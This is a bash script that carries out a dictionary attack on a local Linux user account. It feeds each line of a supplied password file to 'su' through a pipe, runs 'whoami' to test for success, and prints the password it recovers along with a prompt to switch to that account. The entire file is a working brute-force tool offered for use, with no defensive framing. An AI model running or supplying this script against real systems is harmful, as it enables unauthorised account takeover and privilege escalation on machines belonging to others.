#!/bin/bash

USER="${1}"
PASS_FILE="${2}"

# Checks if there are exactly 2 arguments
if [[ ${#} -ne 2 ]]; then
    echo "Usage: ${0} <username> <password_file>"
    exit 1
fi

# Checks if the ${PASS_FILE} parameter is a file
if [[ ! -f ${PASS_FILE} ]]; then
    echo "Error: the argument '${2}' is not a file."
    exit 1
fi

echo
echo "Beginning password attack on: ${USER}"

# Loops through the ${PASS_FILE} line by line
while read -r password; do
    # Likely will break on updated systems and if the account username is different than the output of whoami
    # Inside the if expression is the command to switch users
    # Command: switch user to ${USER} and call the command whoami, if the command runs and can grep ${USER} from the output if whoami then the password is found
    if echo "${password}" | timeout 0.5 su - ${USER} -c 'whoami' | grep -q "${USER}"; then
        echo
        echo "Success! Credentials for ${USER} is ${password}"
        echo
        echo "Use su - ${USER} then provide the password to switch."
        echo
        exit 0
    fi
done < "${PASS_FILE}"

echo
echo "Dictionary attack complete. Unable to find credentials for ${USER}."
echo
exit 1
